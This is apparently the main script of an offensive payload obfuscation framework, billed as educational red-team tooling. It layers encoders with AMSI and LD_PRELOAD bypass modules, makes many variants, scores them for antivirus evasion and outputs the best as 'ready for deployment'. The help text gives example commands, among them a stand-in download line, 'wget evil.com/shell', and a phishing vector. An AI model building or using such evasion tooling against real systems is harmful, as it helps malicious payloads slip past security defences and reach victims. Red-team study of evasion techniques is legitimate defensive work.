#!/usr/bin/env python3
"""
Advanced Payload Encoder & Obfuscation Framework
Author: Rahul Raval - Cybersecurity Engineer
Purpose: Educational red team evasion techniques demonstration
"""

import argparse
import sys
import os
import json
from pathlib import Path

# Add project root to path
sys.path.append(str(Path(__file__).parent))

from encoders.base64 import Base64Encoder
from encoders.xor import XOREncoder
from encoders.rot13 import ROT13Encoder
from obfuscators.unicode import UnicodeObfuscator
from obfuscators.junk_scatter import JunkScatter
from obfuscators.fragment import Fragmenter
from bypasses.amsi_windows import AMSIBypass
from bypasses.ld_preload_linux import LDPreloadBypass
from tester import DetectionTester
from reporter import Reporter

class PayloadFramework:
    def __init__(self):
        self.chains = {
            'basic': ['base64', 'unicode'],
            'stealth': ['unicode', 'base64', 'xor', 'junk'],
            'full': ['unicode', 'base64', 'xor', 'junk', 'fragment', 'amsi', 'ld_preload']
        }
        
        self.components = {
            'base64': Base64Encoder(),
            'xor': XOREncoder(),
            'rot13': ROT13Encoder(),
            'unicode': UnicodeObfuscator(),
            'junk': JunkScatter(),
            'fragment': Fragmenter(),
            'amsi': AMSIBypass(),
            'ld_preload': LDPreloadBypass()
        }
        
        self.tester = DetectionTester()
        self.reporter = Reporter()

    def build_chain(self, chain_type, target_os):
        """Smart chain builder based on target and vector"""
        base_chain = self.chains.get(chain_type, self.chains['basic'])
        
        # OS-specific filtering
        if target_os == 'windows':
            return [c for c in base_chain if c != 'ld_preload']
        elif target_os == 'linux':
            return [c for c in base_chain if c != 'amsi']
        
        return base_chain

    def process_payload(self, payload, chain):
        """Apply obfuscation chain to payload"""
        result = payload
        applied_layers = []
        
        for layer in chain:
            if layer in self.components:
                try:
                    result = self.components[layer].encode(result)
                    applied_layers.append(layer)
                except Exception as e:
                    print(f"⚠️  Layer {layer} failed: {e}")
                    continue
        
        return result, applied_layers

    def generate_variants(self, payload, chain, count):
        """Generate multiple obfuscated variants"""
        variants = []
        
        print(f"🔄 Generating {count} variants...")
        for i in range(count):
            # Add randomization to components
            for comp in self.components.values():
                if hasattr(comp, 'randomize'):
                    comp.randomize()
            
            obfuscated, layers = self.process_payload(payload, chain)
            evasion_score = self.tester.test_payload(obfuscated)
            
            variants.append({
                'id': i + 1,
                'payload': obfuscated,
                'layers': layers,
                'evasion_score': evasion_score,
                'status': '✅ CLEAN' if evasion_score >= 90 else '⚠️ PARTIAL' if evasion_score >= 50 else '❌ DETECTED'
            })
            
            # Progress indicator
            print(f"Variant {i+1}: {evasion_score}% evasion {variants[-1]['status']}")
        
        return variants

def main():
    parser = argparse.ArgumentParser(
        description="Advanced Payload Obfuscation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --payload "whoami" --chain full --variants 10 --test
  python main.py --target windows --vector phishing --variants 20 --test-av
  python main.py --target linux --payload "wget evil.com/shell" --test
        """
    )
    
    parser.add_argument('--payload', required=True, help='Payload to obfuscate')
    parser.add_argument('--chain', choices=['basic', 'stealth', 'full'], default='stealth', help='Obfuscation chain')
    parser.add_argument('--target', choices=['windows', 'linux', 'both'], default='both', help='Target OS')
    parser.add_argument('--variants', type=int, default=5, help='Number of variants to generate')
    parser.add_argument('--test', action='store_true', help='Test against detection engines')
    parser.add_argument('--test-av', action='store_true', help='Test against AV signatures')
    parser.add_argument('--vector', choices=['phishing', 'web', 'network'], help='Attack vector')
    parser.add_argument('--output', help='Output file for results (JSON)')
    
    args = parser.parse_args()
    
    framework = PayloadFramework()
    
    print("🎯 Advanced Payload Obfuscation Framework")
    print("=" * 50)
    print(f"Target: {args.payload}")
    
    # Build appropriate chain
    chain = framework.build_chain(args.chain, args.target)
    print(f"🔗 Chain: {' → '.join(chain)}")
    
    # Generate variants
    variants = framework.generate_variants(args.payload, chain, args.variants)
    
    # Find best variant
    best = max(variants, key=lambda x: x['evasion_score'])
    print(f"\n🏆 BEST: Variant {best['id']} - {best['evasion_score']}% evasion")
    print(f"Ready for deployment: {best['payload'][:100]}...")
    
    # Generate report
    if args.output:
        framework.reporter.generate_report(variants, args.output)
        print(f"📊 Report saved to {args.output}")
    
    # Additional testing
    if args.test_av:
        print("\n🛡️  AV Engine Testing...")
        framework.tester.test_av_engines(best['payload'])

if __name__ == "__main__":
    main()